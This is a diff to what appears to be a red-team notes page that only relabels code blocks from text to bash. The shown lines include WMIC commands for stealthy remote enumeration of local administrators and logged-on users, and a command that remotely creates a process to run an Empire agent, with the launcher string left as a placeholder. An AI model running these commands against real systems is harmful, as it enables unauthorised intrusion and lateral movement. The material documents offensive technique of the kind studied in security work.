@@ -23,7 +23,7 @@ wmic sysaccount list /format:list
 
 For example, here's a very stealthy way to discover local admins on a remote machine \(note that domain is the computer name\):
 
-```text
+```bash
 wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
 ```
 
@@ -41,7 +41,7 @@ wmic /node:@workstations.txt path win32_loggedonuser get antecedent
 
 **We'll remotely create a process over WMI to execute a Empire agent:**
 
-```text
+```bash
 wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
 ```
 
